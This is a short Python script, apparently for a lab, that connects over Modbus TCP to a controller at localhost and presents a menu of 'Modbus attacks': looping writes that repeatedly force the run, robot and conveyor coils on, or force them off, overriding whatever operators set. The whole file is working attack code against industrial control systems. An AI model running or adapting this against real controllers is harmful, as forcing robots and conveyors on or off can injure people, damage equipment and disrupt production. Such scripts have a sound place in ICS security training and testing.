from pymodbus.client import ModbusTcpClient

RUN_CODE = 0
ROBOT_CODE = 1
CONVEYOR_CODE = 2

def move_on():
    while True:
        run_state = client.read_coils(RUN_CODE,1,unit=1)
        run_state = run_state.bits[0]

        if not run_state:
            nonstop = client.write_coil(0,True,unit=1)
            if nonstop.isError():
                print("Write error")
            else:
                print("System up!")

        bot_state = client.read_coils(ROBOT_CODE,1,unit=1)
        bot_state = bot_state.bits[0]

        if not bot_state:
            nonstop = client.write_coil(ROBOT_CODE,True,unit=1)
            if nonstop.isError():
                print("Write error")
            else:
                print("Robot up!")

        con_state = client.read_coils(CONVEYOR_CODE,1,unit=1)
        con_state = con_state.bits[0]

        if not con_state:
            nonstop = client.write_coil(CONVEYOR_CODE,True,unit=1)
            if nonstop.isError():
                print("Write error")
            else:
                print("Conveyor up!")

def stop_all():
    while True:
        run_state = client.read_coils(RUN_CODE,1,unit=1)
        run_state = run_state.bits[0]

        if run_state:
            nonstop = client.write_coil(0,False,unit=1)
            if nonstop.isError():
                print("Write error")
            else:
                print("System down")

        bot_state = client.read_coils(ROBOT_CODE,1,unit=1)
        bot_state = bot_state.bits[0]

        if bot_state:
            nonstop = client.write_coil(ROBOT_CODE,False,unit=1)
            if nonstop.isError():
                print("Write error")
            else:
                print("Robot down")

        con_state = client.read_coils(CONVEYOR_CODE,1,unit=1)
        con_state = con_state.bits[0]

        if con_state:
            nonstop = client.write_coil(CONVEYOR_CODE,False,unit=1)
            if nonstop.isError():
                print("Write error")
            else:
                print("Conveyor down")

def stop_robot():
    while True:
        bot_state = client.read_coils(ROBOT_CODE,1,unit=1)
        bot_state = bot_state.bits[0]

        if bot_state:
            nonstop = client.write_coil(ROBOT_CODE,False,unit=1)
            if nonstop.isError():
                print("Write error")
            else:
                print("Robot down")

def menu():
    try:
        option = int(input("Select a Modbus attack:\n[1] Move On\n[2] Stop all\n[3] Stop robot\n[Other] Exit\n"))
        match option:
            case 1:
                move_on()
                menu()
            case 2:
                stop_all()
                menu()
            case 3:
                stop_robot()
                menu()
            case _:
                print("Exiting...")
    except Exception:
        print("Exiting...")
    except ValueError:
        print("Exiting...")

client = ModbusTcpClient("127.0.0.1",port=502)
if not client.connect():
    print("Connection error")
    exit()
    
print("Connection succesfull")
menu()
client.close()